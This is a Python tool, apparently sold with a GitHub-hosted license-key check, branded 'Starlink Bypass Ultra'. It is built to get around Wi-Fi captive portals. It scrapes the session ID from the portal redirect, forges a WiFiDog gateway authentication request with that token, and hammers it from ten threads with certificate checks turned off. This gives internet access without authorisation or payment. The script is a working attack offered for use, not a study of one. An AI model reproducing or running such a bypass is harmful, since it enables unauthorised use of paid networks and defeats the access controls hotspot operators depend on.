import os
import requests
import re
import urllib3
import time
import threading
import random
import uuid
import sys
from datetime import datetime # ရက်စွဲစစ်ရန် ထည့်ထားသည်
from urllib.parse import urlparse, parse_qs, urljoin
from colorama import Fore, Back, Style, init

# SSL Warning ပိတ်ခြင်း
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

# ===============================
# LICENSE CONFIG
# ===============================
GITHUB_URL = "https://raw.githubusercontent.com/Zyan091/my-database/main/key.txt"
KEY_FILE = os.path.join(os.path.expanduser("~"), ".device_key")

PING_THREADS = 10
DEBUG = False
stop_event = threading.Event()

# ===============================
# SYSTEM FUNCTIONS
# ===============================
def get_or_create_key():
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, "r") as f:
            return f.read().strip()
    else:
        new_key = str(uuid.uuid4())[:12].upper()
        with open(KEY_FILE, "w") as f:
            f.write(new_key)
        return new_key

def check_real_internet():
    try:
        return requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=3).status_code == 204
    except:
        return False

def h_banner():
    os.system('clear')
    print(f"{Fore.MAGENTA}{'='*55}")
    print(f"{Fore.CYAN}   █████╗ ██╗      █████╗ ██████╗ ██████╗ ██╗███╗   ██╗")
    print(f"{Fore.CYAN}  ██╔══██╗██║     ██╔══██╗██╔══██╗██╔══██╗██║████╗  ██║")
    print(f"{Fore.CYAN}  ███████║██║     ███████║██║  ██║██║  ██║██║██╔██╗ ██║")
    print(f"{Fore.CYAN}  ██╔══██║██║     ██╔══██║██║  ██║██║  ██║██║██║╚██╗██║")
    print(f"{Fore.CYAN}  ██║  ██║███████╗██║  ██║██████╔╝██████╔╝██║██║ ╚████║")
    print(f"{Fore.CYAN}  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝")
    print(f"{Fore.MAGENTA}{'='*55}")
    print(f"{Fore.WHITE}{Back.BLUE}      STARLINK BYPASS ULTRA | OWNER: ALLI STAR       ")
    print(f"{Style.RESET_ALL}{Fore.MAGENTA}{'='*55}\n")

# ===============================
# BYPASS CORE LOGIC
# ===============================
def high_speed_ping(auth_link, sid):
    session = requests.Session()
    while not stop_event.is_set():
        try:
            session.get(auth_link, timeout=5, verify=False)
            print(f"{Fore.GREEN}[✓]{Fore.RESET} SID {sid[:8]} | Turbo Active     ", end="\r")
        except:
            break
        time.sleep(random.uniform(0.01, 0.1))

def start_bypass_process():
    print(f"{Fore.CYAN}[*] Starting Bypass Engine...{Fore.RESET}")
    while not stop_event.is_set():
        session = requests.Session()
        try:
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
            if r.url == "http://connectivitycheck.gstatic.com/generate_204":
                if check_real_internet():
                    print(f"{Fore.YELLOW}[•]{Fore.RESET} Internet Active... Monitoring      ", end="\r")
                    time.sleep(10)
                    continue

            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"

            print(f"\n{Fore.CYAN}[*] Portal Detected: {portal_host}")

            r1 = session.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=10)

            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9\-]+)', r2.text)
                sid = sid_match.group(1) if sid_match else None

            if not sid:
                print(f"{Fore.RED}[!] SID not found. Check Starlink connection.")
                time.sleep(5)
                continue

            print(f"{Fore.GREEN}[✓] Session Captured: {sid}")
            
            params = parse_qs(parsed_portal.query)
            gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
            gw_port = params.get('gw_port', ['2060'])[0]
            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"

            for _ in range(PING_THREADS):
                threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True).start()

            while check_real_internet():
                time.sleep(10)

        except Exception as e:
            if DEBUG: print(f"Error: {e}")
            time.sleep(5)

# ===============================
# LICENSE VERIFICATION (EXP SYSTEM INCLUDED)
# ===============================
def verify_license():
    h_banner()
    user_key = get_or_create_key()
    print(f"{Fore.YELLOW}[i] Checking security clearance...")
    print(f"{Fore.WHITE}└─ Device ID: {Fore.GREEN}{user_key}")
    print(f"{Fore.CYAN}{'─'*55}")

    try:
        response = requests.get(GITHUB_URL, timeout=10)
        if response.status_code == 200:
            lines = response.text.splitlines()
            for line in lines:
                if user_key in line:
                    parts = line.split("|")
                    if len(parts) >= 3:
                        key_id = parts[0].strip()
                        status = parts[1].strip().upper()
                        exp_date_str = parts[2].strip()
                        
                        # ရက်စွဲစစ်ဆေးခြင်း
                        today = datetime.now().date()
                        try:
                            exp_date = datetime.strptime(exp_date_str, "%Y-%m-%d").date()
                        except:
                            print(f"{Fore.RED}❌ DATE FORMAT ERROR (Use YYYY-MM-DD)")
                            return False

                        if status == "ACTIVE":
                            if today <= exp_date:
                                print(f"{Fore.CYAN}[+] Status: {Fore.BLACK}{Back.GREEN} ACTIVE ")
                                print(f"{Fore.YELLOW}[i] Expire: {Fore.WHITE}{exp_date_str}")
                                print(f"{Fore.GREEN}✅ Access Granted!")
                                time.sleep(1.5)
                                return True
                            else:
                                print(f"{Fore.RED}[!] Status: {Fore.BLACK}{Back.RED} EXPIRED ")
                                print(f"{Fore.YELLOW}[*] Your access ended on {exp_date_str}")
                                return False
                        else:
                            print(f"{Fore.RED}[!] Status: BANNED / INACTIVE")
                            return False
            
            print(f"{Fore.RED}❌ KEY NOT REGISTERED")
            print(f"{Fore.YELLOW}Please add '{user_key}|ACTIVE|2026-12-31' to GitHub.")
            return False
        else:
            print(f"{Fore.RED}❌ Server Error: {response.status_code}")
            return False
    except Exception as e:
        print(f"{Fore.RED}❌ Connection Lost! Check Internet.")
        return False

# ===============================
# MAIN
# ===============================
if __name__ == "__main__":
    try:
        if verify_license():
            start_bypass_process()
    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n{Fore.RED}Shutdown Engine...{Fore.RESET}")
            
